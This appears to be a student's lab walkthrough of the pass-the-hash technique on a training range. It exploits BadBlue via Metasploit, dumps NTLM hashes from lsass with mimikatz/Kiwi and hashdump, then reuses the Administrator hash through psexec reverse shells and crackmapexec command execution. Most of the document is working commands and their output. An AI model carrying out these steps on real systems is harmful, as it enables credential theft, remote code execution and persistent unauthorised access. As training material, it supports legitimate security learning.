
# Pass The Hash

Pass-the-hash is an exploiting technique that involves captureing or harvesting NTLM hashes or clear text passwords via `SMB`

Once we have the Hash or Clear text password we can authenticate with target legitimately using any tool like `PsExec module`, `crackmapexec` etc...

So in this technique `Having a Hash is same as having clear text password`

# Why is this important

If we have already gained admininstrative access by exploiting some vulnerability why would you still need a legitimate authentication and gain again reverse shell

Answer > So Let's say that the actual service you have exploited on target system is now patched, disabled or a firewall rule is now preventing you from exploiting that service

So if you have the hash of user account or admin account you can now still use that hash and gain access to target system regardlesss of service is patched or not

This again is form of a `Persistence` ie maintain access to the system even if the exploited vulnerability has been patched.

***************************************************************************************************************************************8

# Consider the same lab used for mimikatz, we exploit `Badblue` service to gain initial acess then migrate to `Lsass` process and start the meterpreter in-build mimikatz module `Kiwi`

msf6 exploit(windows/http/badblue_passthru) > `set RHOSTS 10.5.20.134`
RHOSTS => 10.5.20.134
msf6 exploit(windows/http/badblue_passthru) > `exploit`

[*] Started reverse TCP handler on 10.10.26.2:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (175174 bytes) to 10.5.20.134
[*] Meterpreter session 1 opened (10.10.26.2:4444 -> 10.5.20.134:49900) at 2023-12-26 14:07:46 +0530

meterpreter > `sysinfo`
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > `pgrep lsass`
588
meterpreter > `migrate 588`
[*] Migrating from 4904 to 588...
[*] Migration completed successfully.
meterpreter > `getuid`
Server username: NT AUTHORITY\SYSTEM
meterpreter > `load kiwi`
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter >` ?`
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)


meterpreter > `lsa_dump_sam`
[+] Running as SYSTEM
[*] Dumping SAM
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b


meterpreter > 

# Now we have the NTLM hash for Amdinistrator  and student,  We note these down with us

Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d
student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b

# Performing `Pass The Hash` Attack using `PsExec` module of metasploit

Requiremnts

- In order to use this module we will require `NTLM Hash` as well has `LM Hash`, which we can get using `hashdump`

meterpreter > `hashdump`
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
meterpreter > 

We can see the `LM Hash` - aad3b435b51404eeaad3b435b51404ee , which is same for all the user, with NTLM Hash which we already had

aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
********************************************************************************************************************************

# `Now suppose for some reason you lost connection to target maybe because its patched, but since you already have the Hashes you get get access to system again`

# NOTE - Below is how we will perfoirm `Pass The Hash attack` utilizing `PsExec module` once we have the `LM and NTLM hash `for the user

msf6 exploit(windows/http/badblue_passthru) > `search psexec`

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1   auxiliary/admin/smb/psexec_ntdsgrab                           normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   2   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
   3   auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
   4   auxiliary/scanner/smb/psexec_loggedin_users                   normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   5   encoder/x86/service                                           manual     No     Register Service
   6   exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
   7   exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution
   8   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   9   exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   10  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution


Interact with a module by name or index. For example info 10, use 10 or use exploit/windows/smb/webexec

msf6 exploit(windows/http/badblue_passthru) > `use exploit/windows/smb/psexec `
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > `options`

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.26.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/smb/psexec) > `set LPORT 1234`
LPORT => 1234
msf6 exploit(windows/smb/psexec) > `set RHOSTS 10.5.20.134`
RHOSTS => 10.5.20.134
msf6 exploit(windows/smb/psexec) > `set SMBuser Administrator`
SMBuser => Administrator
msf6 exploit(windows/smb/psexec) > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d`
SMBPASS => aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
msf6 exploit(windows/smb/psexec) > `exploit`

[*] Started reverse TCP handler on 10.10.26.2:1234 
[*] 10.5.20.134:445 - Connecting to the server...
[*] 10.5.20.134:445 - Authenticating to 10.5.20.134:445 as user 'Administrator'...
[*] 10.5.20.134:445 - Selecting PowerShell target
[*] 10.5.20.134:445 - Executing the payload...
[+] 10.5.20.134:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.5.20.134
[*] Meterpreter session 4 opened (10.10.26.2:1234 -> 10.5.20.134:50506) at 2023-12-26 14:43:29 +0530

meterpreter >` getuid`
Server username: NT AUTHORITY\SYSTEM
meterpreter > 


# `Pass The Hash` attack using `crackmapexec`,  this only requires NTLM Hash, and we can see we successfully Pwn3d!

root@attackdefense:~# `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d`
SMB         10.5.20.134     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
SMB         10.5.20.134     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!)
root@attackdefense:~# 


root@attackdefense:~# `crackmapexec smb 10.5.20.134 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "ipconfig"`
SMB         10.5.20.134     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
SMB         10.5.20.134     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!)
SMB         10.5.20.134     445    ATTACKDEFENSE    [+] Executed command 
SMB         10.5.20.134     445    ATTACKDEFENSE    Windows IP Configuration
SMB         10.5.20.134     445    ATTACKDEFENSE    
SMB         10.5.20.134     445    ATTACKDEFENSE    
SMB         10.5.20.134     445    ATTACKDEFENSE    Ethernet adapter Ethernet 3:
SMB         10.5.20.134     445    ATTACKDEFENSE    
SMB         10.5.20.134     445    ATTACKDEFENSE    Connection-specific DNS Suffix  . : ap-south-1.compute.internal
SMB         10.5.20.134     445    ATTACKDEFENSE    Link-local IPv6 Address . . . . . : fe80::f4d0:f956:dcb8:9758%8
SMB         10.5.20.134     445    ATTACKDEFENSE    IPv4 Address. . . . . . . . . . . : 10.5.20.134
SMB         10.5.20.134     445    ATTACKDEFENSE    Subnet Mask . . . . . . . . . . . : 255.255.240.0
SMB         10.5.20.134     445    ATTACKDEFENSE    Default Gateway . . . . . . . . . : 10.5.16.1
 